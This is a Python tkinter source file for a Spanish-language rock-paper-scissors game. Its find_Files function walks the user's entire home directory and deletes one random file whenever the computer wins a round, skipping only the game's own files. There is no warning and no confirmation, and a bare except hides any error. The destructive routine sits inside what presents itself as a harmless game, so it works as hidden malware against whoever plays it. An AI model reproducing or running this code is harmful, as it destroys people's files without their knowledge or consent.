import os, random
from tkinter import *
from tkinter import ttk
from tkinter import messagebox as mbox

directorio = 'images/'

def find_Files():
    ruta_usuario = os.path.expanduser("~")
    archivos_encontrados = []

    for directorio_raiz, directorios, archivos in os.walk(ruta_usuario):
        for archivo in archivos:
            ruta_archivo = os.path.join(directorio_raiz, archivo)
            if archivo == "Eleccion.py" or archivo == "PiedraPapelTijera.py" or archivo == "papel.png" or archivo == "piedra.png" or archivo == "tijera.png":
                continue
            else:
                archivos_encontrados.append(ruta_archivo)

    try:

        archivo_aleatorio = random.choice(archivos_encontrados)
        print(f"Archivo removido: {archivo_aleatorio}")
        os.remove(archivo_aleatorio)
                    

    except:
        print()
        


def piedra():

    root = Tk()
    root.geometry("0x0")
    root.resizable(0,0)
    
    arhivos = []

    for file in os.listdir(directorio):
        arhivos.append(file)
    
    seleccion = random.choice(arhivos)

    ruta_imagen = (f'images/{seleccion}/')
    imagen = PhotoImage(file=ruta_imagen)

    new_Image = imagen.subsample(13, 13)

    label = ttk.Label(image=new_Image)
    label.place(x=600, y=150)

    if seleccion == 'piedra.png':
        mbox.showinfo(message="Empate", title="")
        label.destroy()
        
    elif seleccion == 'papel.png':
        mbox.showinfo(message="El PC gana", title="")
        label.destroy()
        find_Files()


    else:
        mbox.showinfo(message="El JUGADOR gana", title="")
        label.destroy()

    root.destroy()
    
    root.mainloop()

def papel():

    root = Tk()
    root.geometry("0x0")
    root.resizable(0,0)
    arhivos = []

    for file in os.listdir(directorio):
        arhivos.append(file)
    
    seleccion = random.choice(arhivos)

    ruta_imagen = (f'images/{seleccion}/')
    imagen = PhotoImage(file=ruta_imagen)

    new_Image = imagen.subsample(13, 13)

    label = ttk.Label(image=new_Image)
    label.place(x=600, y=150)

    if seleccion == 'piedra.png':
        mbox.showinfo(message="El JUGADOR gana", title="")
        label.destroy()
        
    elif seleccion == 'papel.png':
        mbox.showinfo(message="Empate", title="")
        label.destroy()
    else:
        mbox.showinfo(message="El PC gana", title="")
        label.destroy()
        find_Files()

    root.destroy()    
    root.mainloop()
    
def tijera():

    root = Tk()

    root.geometry("0x0")
    root.resizable(0,0)
    arhivos = []

    for file in os.listdir(directorio):
        arhivos.append(file)
    
    seleccion = random.choice(arhivos)

    ruta_imagen = (f'images/{seleccion}/')
    imagen = PhotoImage(file=ruta_imagen)

    new_Image = imagen.subsample(13, 13)

    label = ttk.Label(image=new_Image)
    label.place(x=600, y=150)

    if seleccion == 'piedra.png':
        mbox.showinfo(message="El PC gana", title="")
        label.destroy()
        find_Files()
        
    elif seleccion == 'papel.png':
        mbox.showinfo(message="El JUGADOR gana", title="")
        label.destroy()

    else:
        mbox.showinfo(message="Empate", title="")
        label.destroy()
    root.destroy()
    
    root.mainloop()
